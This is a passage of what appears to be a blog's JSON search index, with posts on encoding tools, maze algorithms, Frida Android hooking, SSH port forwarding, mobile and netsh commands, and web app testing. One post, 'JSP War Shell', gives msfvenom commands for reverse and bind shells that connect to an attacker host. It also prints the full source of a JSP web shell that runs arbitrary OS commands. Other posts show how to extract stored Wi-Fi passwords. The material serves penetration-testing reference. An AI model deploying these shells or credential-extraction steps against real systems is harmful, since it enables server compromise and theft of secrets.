...", "content": "This tool can convert from UTF-8 strings to BaseN (any arbitrary base). It can also convert from BaseN to UTF-8 or HEX. The conversion alphabet can also be specified for these conversions as well. For example, when you convert ASCII to HEX, the output is made up of alphabet 0123456789abcdef. But if we like we can specify the output alphabet to be Gb$&amp;c@=+9521ocx~. This would mean that the HEX char 0 will be represented as a G, the HEX char 1 will be a b, 2 will be $, and so on.As always, be VERY careful when pasting encoded data into arbitrary websites! Encoded strings could contain any kind of data, including passwords and tokens, and therefore must be treated as confidential.ALL processing on this website is done client-side. However, this may not be case with other sites.NOTE using 64 as the base, will NOT give the same results as traditional Base64. If you are unsure why this is the case, you can read how traditional Base64 works here.ModeEncodeDecodeBaseInputConversion AlphabetOutput UTF-8 HEX" }, { "title": "Maze Colouring with DFS and BFS", "url": "/posts/maze-colouring-with-dfs-and-bfs/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, maze, fun", "date": "2021-11-07 22:29:48 +1000", "snippet": "Maze colouring using BFS (Breadth-First Search) and DFS (Depth-First Search). For reference, the mazes in the below examples were generated using the Randomized Depth-First Search (Recursive Backtr...", "content": "Maze colouring using BFS (Breadth-First Search) and DFS (Depth-First Search). For reference, the mazes in the below examples were generated using the Randomized Depth-First Search (Recursive Backtracking) and Aldous-Broder algorithms. What are we Doing? Colour Gradient Small Static Example Bigger Static Example DFS (Depth-First Search) Animation BFS (Breadth-First Search) Animation Aldous-Broder Maze GenerationWhat are we Doing?This post will visually demonstrate the difference of traversing through a maze using the BFS and DFS search methods. This post already assumes you know what both these methods are.Colour GradientWe’ll use the below colour gradient to show how far away cells are from the origin. The hue value of the cell will be scaled from 0 to 300, where 0 is the closest, and 300 is the furthest. Closest Furthest AwaySmall Static ExampleThe below maze is an example what we start with:We then choose a random cell to be the starting point, then calculate how far away every cell in the maze is. We then colour the cell based on its distance using the colour gradient above.Bigger Static ExampleIf we increase the size of the maze, and remove the walls so the colours come through, we can get some interesting looking patterns:DFS (Depth-First Search) AnimationThe aboves images may look cool, but they don’t show any difference regarding the algorithm used (BFS or DFS). We need to see an animation of the construction to see the difference.The following two videos will demonstrate the DFS traversal method. These mazes were generated using the Recursive Backtracking method. Now on a bigger maze with no walls: BFS (Breadth-First Search) AnimationThe following two videos will demonstrate the BFS traversal method. These mazes were generated using the Recursive Backtracking method. Now on a bigger maze with no walls: Aldous-Broder Maze GenerationRecall that a spanning tree of a undirected graph is a tree that connects all the vertices of the graph, but contains no cycles. Each maze is one possible spanning tree of all the vertices in the graph.All the previous mazes were generated using the Recursive Backtracking method. Mazes generated using this method tend to have long paths with less dead ends.The Aldous-Broder method is different as it has a equal chance of generating each possible spanning tree (maze). The two mazes below were generated with this method. Now on a bigger maze with no walls: " }, { "title": "FABRIK Algorithm", "url": "/posts/fabrik-algorithm/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, plexus, fun", "date": "2021-11-04 18:35:22 +1000", "snippet": "In this post we’ll look at how to implement the FABRIK algorithm in 2D in JavaScript using the p5.js library for drawing. The Forward And Backward Reaching Inverse Kinematics (FABRIK) algorithm is ...", "content": "In this post we’ll look at how to implement the FABRIK algorithm in 2D in JavaScript using the p5.js library for drawing. The Forward And Backward Reaching Inverse Kinematics (FABRIK) algorithm is a heuristic, iterative solver for the Inverse Kinematics problems. What is the Goal? Starting Configuration End Configuration The Algorithm Step 1 Step 2 Step 3 Full Single Iteration Second Iteration CompletedWhat is the Goal?Given a set of nodes that are connected together, we want to know how they should move when the end node is moved.Starting Configuration The Blue Node is our fixed starting point. The Green Node is position where we want to move the end (left most) Node.End ConfigurationThis is our end goal configuration which we want to calculate:The AlgorithmThe algorithm is iterative, so we will repeatable be doing the same steps until we reach our desired result. The steps of the algorithm are as follows: Move the first point desired location. Move the next point towards the previous so that it’s the correct distance away. Repeat Step 2 until all points are processed.The above steps are a single iteration. Once a single iteration is complete, we do it again, but in the reverse order. So the point we finished on will be the starting point in the next iteration.Step 1Move the first point to the desired location (the Green Node):Starting configurationMoving Point 1 to target location (Green Node)Step 2Move the next point towards the previous (in this case the first node) so it’s the correct distance away:Moving Point 2 towards Point 1Step 3Repeat Step 2 until all points are processed:Moving Point 3 towards Point 2Moving Point 4 towards Point 3ITERATION COMPLETEFull Single IterationSecond IterationNotice that the order of the points has been reversedMoving Point 1 to target location (Blue Node)Moving Point 2 towards Point 1Moving Point 3 towards Point 2Moving Point 4 towards Point 3ITERATION COMPLETECompletedAfter performing 20 iterations (10 each way) we have the following result:References https://www.sciencedirect.com/science/article/abs/pii/S1524070311000178?via%3Dihub https://en.wikipedia.org/wiki/Inverse_kinematics https://p5js.org/" }, { "title": "Android Hooking in Frida", "url": "/posts/android-hooking-in-frida/", "categories": "security, mobile", "tags": "security, mobile, android, frida, programming, javascript", "date": "2021-10-30 00:19:01 +1000", "snippet": "Intro guide on how to use Frida to hook Android applications at runtime to inject code and override methods. This guide already assumes you have frida installed and have frida-server installed on y...", "content": "Intro guide on how to use Frida to hook Android applications at runtime to inject code and override methods. This guide already assumes you have frida installed and have frida-server installed on your Android device. Basic Android Hooking Class Methods - WebView URL Script Breakdown Dealing with Types Class Constructors Creating Objects Already Created Objects WebView DevTools Hooking Strings toString Methods String Equals Basic Android HookingClass Methods - WebView URLThe following code will show how to hook a Method in a class and set the implementation to the custom code we define.We’ll create a new file called webview.js and put the following code:Java.perform(function() {\tlet Webview = Java.use(\"android.webkit.WebView\");\tconsole.log('\\n\\n[+] Using \"android.webkit.WebView\"\\n');\tWebview.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\t\tconsole.log('[+] WebView loadUrl =&gt;', url);\t\tthis.loadUrl.overload(\"java.lang.String\").call(this, url);\t}});We will then call this use this script with frida on our target application:frida -U -f com.example.app -l webview.js --no-pause -U for USB mode -f to tell frida to start the app -l to specify the script to load --no-pause to tell frida not to pause the app when it first starts so we don’t have to manually resume it (Optional)Script BreakdownLet’s breakdown the above script a bit further and explain what each part is doing:let Webview = Java.use(\"android.webkit.WebView\"); Get a reference to the android.webkit.WebView classWebview.loadUrl.overload(\"java.lang.String\") Get a reference to the loadUrl method in the Webview (android.webkit.WebView) class. Specifically the method that takes a String parameter. Java methods can be overloaded (multiple methods with same name but take different params), so we need to be specific which method.Webview.loadUrl.overload(\"java.lang.String\").implementation = function(url) { ... } Set the implementation of the loadUrl method to the function that we define. This is applied for all instances of Webview class.this.loadUrl.overload(\"java.lang.String\").call(this, url); Call the original implementation. We have to specific java.lang.String in the overload method so we call the correct one.Dealing with TypesFor Methods that take string parameters it’s very easy to find that we should put java.lang.String as the type, but what about something more complex? What if the function accepts a Byte array, or Custom class as a parameter? How do we know what type to put?We could search on Google, or for a quicker method, let the frida errors tell us. If we change java.lang.String to something invalid like abcd, frida will tell us that the signature doesn’t match any of the overloads, and it will tell us what to put to make it valid. Using the previous script as a example:Webview.loadUrl.overload(\"abced\")[+] Using \"android.webkit.WebView\"Error: loadUrl(): specified argument types do not match any of: .overload('java.lang.String') .overload('java.lang.String', 'java.util.Map') at X (frida/node_modules/frida-java-bridge/lib/class-factory.js:563)From this we can see there are two overloads available: overload('java.lang.String') overload('java.lang.String', 'java.util.Map')Class ConstructorsWe can hook the constructor of a class using $init as the method name.We’ll use the okhttp3 library and Response class within as an example.const printObj = (obj) =&gt; {\tObject.entries(obj).forEach(([key, value]) =&gt; {\t\tconsole.log(` - (${typeof(value)}):`, value)\t});}Java.perform(function() {\tlet params = ['okhttp3.Request', 'okhttp3.Protocol', 'java.lang.String', 'int', 'okhttp3.Handshake', 'okhttp3.Headers', 'okhttp3.ResponseBody', 'okhttp3.Response', 'okhttp3.Response', 'okhttp3.Response', 'long', 'long', 'okhttp3.internal.connection.Exchange'];\tlet okHttp3Response = Java.use('okhttp3.Response');\tconsole.log(`\\n\\n[+] Hooking \"okhttp3.Response\"\\n`);\tokHttp3Response.$init.overload(...params).implementation = function() {\t\tconsole.log('[+] Response Captured:');\t\tprintObj(arguments);\t\tthis.$init.overload(...params)(...arguments);\t}});Calling Static MethodsJava.perform(function() {\tlet AndroidUnicodeUtils = Java.use('com.facebook.hermes.unicode.AndroidUnicodeUtils');\tlet result1 = AndroidUnicodeUtils.convertToCase('test string', 0, false);\tlet result2 = AndroidUnicodeUtils.convertToCase('TEST STRING', 1, false);\tlet result3 = AndroidUnicodeUtils.dateFormat(1636880183370.0, true, true);\tconsole.log('\\n\\n[+] Result1:', result1);\tconsole.log('[+] Result2:', result2);\tconsole.log('[+] Result3:', result3);});OUTPUTC:\\&gt;frida -U -f com.facebook.orca -l call-static-method.js --no-pause...Spawned `com.facebook.orca`. Resuming main thread![Pixel XL::com.facebook.orca]-&gt;[+] Result1: TEST STRING[+] Result2: test string[+] Result3: Nov 14, 2021 7:56:23 PMCreating ObjectsTODO: NOT COMPLETEDAlready Created ObjectsTODO: NOT COMPLETEDWebView DevToolsIf the target application is using webview to load content, it’s possible to view the developer tools for the mobile app like you can in any other browser.You can following the guide on the Google Chrome website about Remote Debugging WebViews found here.However, it’s very likely that the application won’t have webContentsDebugging enabled. Luckily though, we can do it very easily with Frida. We’ll save the below script in a file called webview-remote-debug.js.Java.perform(function() {\tlet Webview = Java.use(\"android.webkit.WebView\");\tconsole.log('\\n\\n[+] Hooking \"android.webkit.WebView\"\\n');\tWebview.setWebContentsDebuggingEnabled(true);\tconsole.log('[+] Enabled WebContentsDebugging\\n');});We’ll use the above code on the Amazon Shopping app:C:\\&gt;adb shell pm list packages | findstr amazonpackage:com.amazon.mShop.android.shoppingC:\\&gt;frida -U -f com.amazon.mShop.android.shopping -l webview-remote-debug.js --no-pause...Spawned `com.amazon.mShop.android.shopping`. Resuming main thread![Pixel XL::com.amazon.mShop.android.shopping]-&gt;[+] Using \"android.webkit.WebView\"[+] Enabled WebContentsDebuggingWe can now use devtools to run JavaScript, inspect elements, view network traffic, view cookies, view session/local storage, etc.NOTE: If the application isn’t coming up, try closing Chrome completely and reloading chrome://inspect/#devices as sometimes it can be buggy.Hooking StringsThere will most likely be A LOT of output from the below scripts:toString MethodsJava.perform(function() {\tconsole.log();\tlet StringBuilder = Java.use('java.lang.StringBuilder');\tlet StringBuffer = Java.use('java.lang.StringBuffer');\tStringBuilder.toString.overload().implementation = function() {\t\tlet StringBuilderResult = this.toString.call(this);\t\tconsole.log(\"[+] StringBuilder:\\t\", StringBuilderResult);\t\treturn StringBuilderResult;\t}\tStringBuffer.toString.overload().implementation = function() {\t\tlet StringBufferResult = this.toString.call(this);\t\tconsole.log(\"[+] StringBuffer:\\t\", StringBufferResult);\t\treturn StringBufferResult;\t}});String EqualsJava.perform(function() {\tconsole.log();\tlet str = Java.use('java.lang.String');\tstr.equals.overload('java.lang.Object').implementation = function(obj) {\t\tlet StringEqualsResult = this.equals.overload('java.lang.Object').call(this, obj);\t\tconsole.log(`[+] StringEquals (${StringEqualsResult}):`);\t\tconsole.log(\" [String1]:\", this.toString());\t\tconsole.log(\" [String2]:\", obj.toString());\t\treturn StringEqualsResult;\t}});Resources &amp; References https://frida.re/docs/examples/android/ https://github.com/iddoeldor/frida-snippets" }, { "title": "JSP War Shell", "url": "/posts/jsp-war-shell/", "categories": "security, web", "tags": "web, http, https, security, jsp, java, war, shell, rce", "date": "2021-10-25 19:09:48 +1000", "snippet": "How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s). JSP War Shell MSFVenom ...", "content": "How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s). JSP War Shell MSFVenom JSP War Reverse Shell JSP War Bind Shell Dealing with Errors JSP War Simple Browser Shell Example Shell Running on Windows Example Shell Running on Linux Package with Java Package Manually JSP War Shell MSFVenomUsing the msfvenom tool built into Kali, we can see what shells we have available:root@kali:~# msfvenom --list payloads | grep jsp java/jsp_shell_bind_tcp Listen for a connection and spawn a command shell java/jsp_shell_reverse_tcp Connect back to attacker and spawn a command shellroot@kali:~# We can check what settings need to be specified using:msfvenom -p java/jsp_shell_bind_tcp --list-optionsmsfvenom -p java/jsp_shell_reverse_tcp --list-optionsJSP War Reverse Shellmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war &gt; shell.warA netcat listener can be setup to listen for the connection using:nc -nvlp 3155JSP War Bind Shellmsfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war &gt; bind.warWe can then use netcat to connect to the bind shell:nc -nv 192.168.0.123 3155Dealing with ErrorsThe above two shells are designed to working with Windows and Linux servers. However, sometimes the following message can come up after trying to load the application:This can be resolved by unzipping the war file, removing the System call, and replacing the OS check with correct shell path:String ShellPath = new String(\"cmd.exe\");JSP War Simple Browser ShellApologies for the below code highlight, apparently the code highlighter doesn’t like JSP code.&lt;body style=\"background: rgb(30,30,30);\"&gt;&lt;form method=\"GET\" action=\"index.jsp\"&gt; &lt;h4 style=\"color: white;\"&gt;Command Options&lt;/h4&gt; &lt;select id=\"osType\" name=\"osType\"&gt; &lt;option value=\"win\"&gt;Windows&lt;/option&gt; &lt;option value=\"linux\"&gt;Linux&lt;/option&gt; &lt;/select&gt; &lt;/br&gt; &lt;/br&gt; &lt;input id=\"cmd\" name=\"cmd\" type=text autofocus style=\"width: 300px;\"&gt; &lt;input type=submit value=\"Run Command\"&gt;&lt;/form&gt;&lt;%@ page import=\"java.io.*\" %&gt;&lt;%! // Not Perfect, but will be good enough for a majority of cases that will arise public String HtmlEncode(String inputVal) { return inputVal.replaceAll(\"&amp;\", \"&amp;amp;\").replaceAll(\"&lt;\", \"&amp;lt;\").replaceAll(\"&gt;\", \"&amp;gt;\").replaceAll(\"\\'\", \"&amp;apos;\").replaceAll(\"\\\"\", \"&amp;quot;\"); } public String RunCommand(String commandToRun, String osType) { String outputString = \"\"; String currentLine = null; try { ProcessBuilder processBuilder = new ProcessBuilder(); if (osType.equals(\"win\")) { processBuilder.command(\"cmd\", \"/c\", commandToRun); } else { processBuilder.command(\"bash\", \"-c\", commandToRun); } Process p = processBuilder.start(); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((currentLine = sI.readLine()) != null) { outputString += HtmlEncode(currentLine) + \"&lt;/br&gt;\"; } } catch(IOException e) { outputString = \"ERROR: &lt;/br&gt;&lt;/br&gt;\" + e.getCause() + \"&lt;/br&gt;&lt;/br&gt;\" + e.getMessage() + \"&lt;/br&gt;\"; } return outputString; }%&gt;&lt;% String osType = request.getParameter(\"osType\"); String cmd = request.getParameter(\"cmd\"); String output = \"\"; String htmlCmd = \"\"; String htmlOsType = \"\"; if (osType == null || (!osType.equals(\"win\") &amp;&amp; !osType.equals(\"linux\"))) { osType = \"linux\"; } if(cmd != null) { String line = null; String testCommand = RunCommand(\"\", osType); if (testCommand.startsWith(\"ERROR:\")) { output = RunCommand(cmd, osType); } else { if (osType.equals(\"win\")) { output = \"&lt;b style=\\\"color: white;\\\"&gt;\" + HtmlEncode(RunCommand(\"cd\", osType).trim().replaceAll(\"&lt;/br&gt;\", \"\").replaceAll(\"\\r\", \"\").replaceAll(\"\\n\", \"\")) + HtmlEncode(\"&gt; \") + HtmlEncode(cmd) + \"&lt;/br&gt;&lt;/br&gt;&lt;/b&gt;\"; } else { String username = HtmlEncode(RunCommand(\"whoami\", osType).trim().replaceAll(\"&lt;/br&gt;\", \"\").replaceAll(\"\\r\", \"\").replaceAll(\"\\n\", \"\")); String hostname = HtmlEncode(RunCommand(\"hostname\", osType).trim().replaceAll(\"&lt;/br&gt;\", \"\").replaceAll(\"\\r\", \"\").replaceAll(\"\\n\", \"\")); String workingDir = HtmlEncode(RunCommand(\"pwd\", osType).trim().replaceAll(\"&lt;/br&gt;\", \"\").replaceAll(\"\\r\", \"\").replaceAll(\"\\n\", \"\")); String userAndHost = \"&lt;b style=\\\"color: rgb(136,223,51);\\\"&gt;\" + username + \"@\" + hostname + \"&lt;/b&gt;\" + \"&lt;span style=\\\"color: white;\\\"&gt;:&lt;/span&gt;\"; String dirPath = \"&lt;span style=\\\"color: rgb(114,159,207);\\\"&gt;\" + workingDir + \"&lt;/span&gt;\"; output = userAndHost + dirPath + \"&lt;span style=\\\"color: white;\\\"&gt;# \" + HtmlEncode(cmd) + \"&lt;/span&gt;&lt;/br&gt;&lt;/br&gt;\"; } output += RunCommand(cmd, osType); } htmlCmd = HtmlEncode(cmd); htmlOsType = HtmlEncode(osType); }%&gt;&lt;pre style=\"color: white;\"&gt;&lt;%=output %&gt;&lt;/pre&gt;&lt;script&gt; let cmdValue = \"&lt;%=htmlCmd %&gt;\".replaceAll(\"&amp;quot;\", \"\\\"\").replaceAll(\"&amp;apos;\", \"\\'\").replaceAll(\"&amp;gt;\", \"&gt;\").replaceAll(\"&amp;lt;\", \"&lt;\").replaceAll(\"&amp;amp;\", \"&amp;\"); let osTypeValue = \"&lt;%=htmlOsType %&gt;\"; if (osTypeValue !== 'win' &amp;&amp; osTypeValue !== 'linux') osTypeValue = 'linux'; document.getElementById('cmd').value = cmdValue; document.getElementById('osType').value = osTypeValue;&lt;/script&gt;&lt;/body&gt;Example Shell Running on WindowsExample Shell Running on LinuxPackage with JavaWith the above JSP code, we can bundle it into a war file using the jar tool that comes with Java JDK:jar -cvf OUTPUT_FILE INPUT_FILESjar -cvf browser-shell.war index.jsp index.jsp can also be substituted with * to bundle all the files in the current folder.Package ManuallyAlternatively, you can create a folder called META-INF, and inside that folder created a file called MANIFEST.MF. This file should contain the manifest version and Java version:Manifest-Version: 1.0Created-By: 17.0.1 (Oracle Corporation)We then create a zip file with the index.jsp file and the META-INF folder using a tool like 7zip. The output file should be renamed so it has the .war extension. The contents of the war file should look like this:(FILE) index.jsp(FOLDER) META-INF(FILE) MANIFEST.MF" }, { "title": "Basic SSH & SSH Port Forwarding", "url": "/posts/basic-ssh-&-ssh-port-forwarding/", "categories": "security, ssh", "tags": "security, ssh, port-forwarding, server, linux", "date": "2021-10-21 23:17:04 +1000", "snippet": "Guide for basic SSH usage and SSH Port Forwarding. Basic SSH Connect to Host Connect to Host with Private Key Connect to Host with Certain KeyExchange &amp; Cipher Copy Fil...", "content": "Guide for basic SSH usage and SSH Port Forwarding. Basic SSH Connect to Host Connect to Host with Private Key Connect to Host with Certain KeyExchange &amp; Cipher Copy Files to Host Copy Files from Host Nmap Scanning SSH Port Forwarding Local SSH Port Forward Remote SSH Port Forward Gateway Ports Dynamic SSH Port Forward Basic SSHConnect to Hostssh USER@HOST_IP -p 2222 -p to specify the port (22 is default)Connect to Host with Private Keyssh -i PRIVATE_KEY USER@HOST_IPCopy Files to Hostscp local_file.txt USER@HOST_IP:/tmp/remote_file.txtCopy Files from Hostscp USER@HOST_IP:/tmp/remote_file.txt local_file.txt Connect to Host with Certain KeyExchange &amp; Cipherssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-ctr USER@HOST_IPNmap ScanningCheck Authentication Methodsnmap -p 22 --script ssh-auth-methods --script-args=\"ssh.user=&lt;username&gt;\" &lt;target&gt; https://nmap.org/nsedoc/scripts/ssh-auth-methods.htmlCheck Supported Algorithmsnmap -p 22 --script ssh2-enum-algos &lt;target&gt; https://nmap.org/nsedoc/scripts/ssh2-enum-algos.htmlCheck Supported SSH Versionsnmap -p 22 -sV -sC &lt;target&gt; https://nmap.org/nsedoc/scripts/sshv1.htmlRetrieve Host Keynmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=all &lt;target&gt; https://nmap.org/nsedoc/scripts/ssh-hostkey.htmlSSH Port ForwardingLocal SSH Port ForwardLet’s say a remote host has an application listening on localhost:3000 and you want to connect to it from your local computer. Perhaps it’s a database listening on localhost and you don’t want it exposed to the network/internet.Using a Local Port Forward we can setup a listener on our local computer, which when we connect to will go through the SSH tunnel to the listener on the remote host.Here is the command that will allow us to do that:ssh -L 1337:localhost:3000 USER@REMOTE_HOST_IPThis command will setup a listener on your local machine on localhost:1337. Connecting to this will be the same as if you connected to localhost:3000 on the remote host.Remote SSH Port ForwardLet’s say you have an application listening on localhost:9595 on your local computer and your friend wants to connect to your application. However, both you and your friend home networks are behind CGNAT so you can’t directly connect to each other or setup normal router port forwards.With an additional internet facing server (VPS such as an EC2 instance), you can do the following:On your computer:ssh -R 9000:localhost:9595 USER@REMOTE_HOST_IPThis command will setup a listener on the remote host on localhost:9000. Connecting to the remote host on localhost:9000 will be the same as if you connected to localhost:9595 on your local machine.This situation is now the same as a Local Port Forward. The remote host is now listening on localhost:9000. Your friend can now create a new listener on their computer using a Local Port Forward.On your friends computer:ssh -L 1337:localhost:9000 USER@REMOTE_HOST_IPGateway PortsFor the above example we had todo two port forwards, this isn’t ideal is some cases. Ideally we would like to setup a listen on a specific interface or on 0.0.0.0. However, when we do an SSH Port Forward, the default listener is on 127.0.0.1. To change this and allow it to listen on all interfaces, we need to enabled the GatewayPorts options on the SSH Server and restart it.Dynamic SSH Port ForwardWhen setting up a dynamic SSH port forward, a SOCKS server is created that is enclosed by an SSH tunnel. This allows arbitrary TCP connections to be proxies through the target server.For example, if you were in on network and needed to access resources that were only accessible through a jump host, you could use a dynamic SSH port forward to access them. After setting up the port forward with the below command, a SOCKS proxy server will be listen on port 1080 (the default SOCKS port) on the local computer. Arbitrary programs can now use the SOCKS proxy to access the restricted resources as the connections will be coming from the jump host (which is allowed to communicate with said resources).ssh -D 1080 USER@REMOTE_HOST_IPA SOCKS proxy can also be setup through an RDP connection using the SocksOverRDP tool from NCC Group. This version of the RDP client may need to be used for the latest version of RDP" }, { "title": "Mobile Useful", "url": "/posts/mobile-useful/", "categories": "security, mobile", "tags": "security, mobile, android, ios", "date": "2021-10-15 21:55:49 +1000", "snippet": "Collection of commands for when working with Android and iOS devices. Device must be Rooted/Jailbroken for almost all commands. Both Objection Search Files for String Search for...", "content": "Collection of commands for when working with Android and iOS devices. Device must be Rooted/Jailbroken for almost all commands. Both Objection Search Files for String Search for File Name Extract App Files Android Android Debug Bridge (adb) Wifi Passwords Network Interfaces iOS Binary Info Screenshot Location NSAllowsArbitraryLoads NSURL Caching BothObjectionAnother post has been created that is entirely dedicated to using Objection with Android and iOS. That post can be found here.Search Files for StringPrint files that contain a certain strings when in device shell (adb shell). Good for searching for clear-text data stored by apps:grep -ril '/PATH_TO_SEARCH' -e 'SEARCH_TERM`Search for File Namefind SEARCH_DIR -name *.sqlitefind SEARCH_DIR -name *.sqlite 2&gt;/dev/null 2&gt;/dev/null can be used to hide permission denied errors.Extract App FilesUse the following command to archive an entire app folder so that it can be extracted and viewed on a computer more easily:tar -cvzf OUTPUT_FILE FOLDER_TO_TARtar -cvzf /sdcard/files.tar /data/user/0/com.example.app/AndroidAndroid Debug Bridge (adb)The target device will need to have USB (or wifi) debugging enabled Description Command View Connected Devices adb devices View Connected Devices (with Device Info) adb devices -l Install Package (apk) adb install local_path_to_apk Uninstall Package adb shell pm uninstall com.example.TestApp Get Packages (All Packages) adb shell pm list packages Get Packages (Full APK Path) adb shell pm list packages -f Get Packages (3rd Party Only) adb shell pm list packages -3 Get Packages (System Packages Only) adb shell pm list packages -s Interactive Shell adb shell Run Command without Interactive Shell adb shell ls -la /sdcard/ Copy file TO Device adb push local_path remote_path Copy file FROM Device adb pull remote_path local_path View Logs adb logcat Screenshot adb shell screencap /sdcard/screenshot.png Screen Record adb shell screenrecord /sdcard/record.mp4 Screen Record (with time limit) adb shell screenrecord –time-limit time_in_seconds /sdcard/record.mp4 Enable/Disable Wifi adb shell svc wifi enable/disable Simulate KeyPress (Home Button) adb shell input keyevent KEYCODE_HOME Simulate KeyPress (0400) adb shell input keyevent 7 11 7 7 Start Activity (Call a Number) adb shell am start -a android.intent.action.DIAL -d tel:+61400000000 Start Activity (SMS Someone) adb shell am start -a android.intent.action.SENDTO -d smsto:+61400000000 –es sms_body ‘Test SMS’ –ez exit_on_sent false local refers to a location/file on the connected PC. remote refers to a location/file on the connected Device (phone). More keyevent codes can be found online in the Android Docs.Wifi PasswordsNOTE: that this is a restricted folder, so the device will need to be Rooted. Go to the directory /data/misc/wifi. Wifi configuration data should be in WifiConfigStore.xml or wpa_supplicant.conf.Network Interfaces Description Command Show Network Interfaces ip -f inet addr show Show Single Network Interface ip -f inet addr show interface_name iOSBinary InfoDisplay info about an installed binary on an iOS device. Requires iOS device to be jailbroken and the Radare2 tool to be installed. Radare can be installed through Cydia: Source = https://cydia.radare.org/ Package = Radarerabin2 -I /private/var/containers/Bundle/Application/INSERT_ID/APP_NAME/APP_BINARY -I Show binary infoExample with DuckDuckGo app:rabin2 -I /private/var/containers/Bundle/Application/INSERT_ID/DuckDuckGo.app/DuckDuckGoarch armbaddr 0x100000000binsz 2753920bintype mach0bits 64canary trueclass MACH064crypto trueendian littlehavecode trueintrp /usr/lib/dyldladdr 0x0lang swiftlinenum falselsyms falsemachine allmaxopsz 4minopsz 4nx falseos darwinpcalign 4pic truerelocs falsesanitiz falsestatic falsestripped truesubsys darwinva trueScreenshot LocationIf you take a screenshot, the image will be stored in the following location: /private/var/mobile/Media/DCIM/100APPLE/NSAllowsArbitraryLoadsSearch the app’s Info.plist file for the NSAppTransportSecurity key. Ensure the value for NSAllowsArbitraryLoads key is set to false unless there is a good reason not to.Example:&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;&lt;dict&gt; &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt; &lt;true/&gt;&lt;/dict&gt;NSURL CachingNSURLRequests get cached in a file called cache.db unless explicitly stated not to using the cachePolicy parameter when creating a NSURLRequest object." }, { "title": "Netsh Get Info", "url": "/posts/netsh/", "categories": "security, windows", "tags": "security, windows, cmd, powershell, netsh", "date": "2021-10-05 22:46:19 +1000", "snippet": "Collection of interesting and useful commands for the Netsh tool in Windows. Netsh has a huge amount of functionality, this is by no means exhaustive. Description Command ...", "content": "Collection of interesting and useful commands for the Netsh tool in Windows. Netsh has a huge amount of functionality, this is by no means exhaustive. Description Command Show Wifi Profiles netsh wlan show profiles Show Wifi Profile Password netsh wlan show profile wifi_name key=clear Show Interface Status netsh interface ipv4 show interfaces Show Interface IPs netsh interface ipv4 show ipaddresses Show Interface IP, Gateway, Subnet netsh interfaces ipv4 show addresses Show Network Routing netsh interface ipv4 show route Show DNS Servers netsh interface ipv4 show dnsservers Show Cached IPs &amp; MACs of Known Hosts netsh interface ipv4 show neighbors Show Current TCP Connections netsh interface ipv4 show tcpconnections Show Firewall Status netsh advfirewall show allprofiles " }, { "title": "Web App Checklist", "url": "/posts/web-app-checklist/", "categories": "tools", "tags": "tools, security, web, http, https", "date": "2021-10-04 07:14:02 +1000", "snippet": "This page is an interactive tool of this page. All the data for this checklist application is STORED CLIENT-SIDE. This application works by storing data in localStorage so that it’s persistent betw...", "content": "This page is an interactive tool of this page. All the data for this checklist application is STORED CLIENT-SIDE. This application works by storing data in localStorage so that it’s persistent between reloads.You will need popups (dialogs) enabled for this application to work properly.New ProjectDelete ALL Projects\t\t\t\t\t\tProject Name\t\t\tCreation Time\t\t\tChecks Complete\t\t\t\t\t\t\t\tLoaded Project:" }, { "title": "Web App Security", "url": "/posts/web-app-security/", "categories": "security, web", "tags": "web, http, https, security, csrf, cookies", "date": "2021-09-29 17:01:50 +1000", "snippet": "General purpose guide for testing Web Applications. This list is not supposed to be exhaustive, nor is the information absolute. Each web application is different and the business case needs to be ...", "content": "General purpose guide for testing Web Applications. This list is not supposed to be exhaustive, nor is the information absolute. Each web application is different and the business case needs to be thought about when assessing the below items. The checks are not explained in depth on purpose and should be used as a reference only. HTTP Headers Server Version Disclosure X-Frame Options - Missing X-Content-Type-Options - Missing CORS - Wildcard CORS - Reflected Origin HSTS - Missing HSTS - Insecure CSP - Missing CSP - Insecure Referrer-Policy - Missing Referrer-Policy - Insecure X-XSS-Protection - Missing X-XSS-Protection - Insecure Host Header Injection Header Injection Duplicate Headers Session &amp; Cookies Missing Attribute - Secure Missing Attribute - HTTPOnly Missing Attribute - SameSite Path Attribute Concurrent Sessions Session Token Entropy Session Timeout Session Termination Session Fixation Session Cookie Not Changing Session Not Invalidated After Changing Password Decode Cookies Lack of Logout Functionality Authentication Login with no Password Lack of MFA Account Lockout Account Lockout on Change Password No MFA Lockout MFA Bypass User Enumeration - Error Based User Enumeration - Time Based Password Strength Password History Case Insensitive Password Client-Side Password Requirements Password Not Required to Change Password Use of Basic Authentication No Method to Change Password User Account DoS Authorisation Remove Cookies ONE at a time Remove ALL Cookies and/or Tokens JWT Checks Unauthorised Data Access Unauthorised API Access Horizontal Privilege Escalation Vertical Privilege Escalation Forceful Browsing CSRF CSWSH Data Storage Sensitive Cookies Session Storage Local Storage Window Object Returned Data Input Validation Lack of Validation Client-Side Validation Reflected Parameters CSV Injection Output Encoding Error Messages Parameter Pollution Mass Assignment File Upload Directory Traversal Server Configuration Directory Listing TLS Configuration Wildcard Certificate TRACE Method Enabled Outdated Libraries in Use Sensitive Information in URL Lack of Subresource Integrity Checks Lack of HTTPS Use of HTTP (no TLS) Sequential IDs POST Requests as GET Requests No WAF Rate Limiting Database Storage HTTP HeadersServer Version DisclosureEnsure the server does not disclose any information about the underlying server software or operating system.HTTP/1.1 200 OKServer: Microsoft-IIS/10.0X-AspNet-Version: 4.0.30319X-Powered-By: ASP.NETServer: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.5X-Powered-By: ExpressX-Frame Options - MissingEnsure HTTP responses that contain HTML pages have the X-Frame-Options header set.X-Frame-Options: DENYX-Frame-Options: SAMEORIGINX-Frame-Options: ALLOW-FROM uri More info at MDN Web Docs: X-Frame-Options HeaderX-Content-Type-Options - MissingEnsure the HTTP responses contain the X-Content-Type-Options: nosniff header. More info at MDN Web Docs: X-Content-Type-Options HeaderCORS - WildcardCheck if 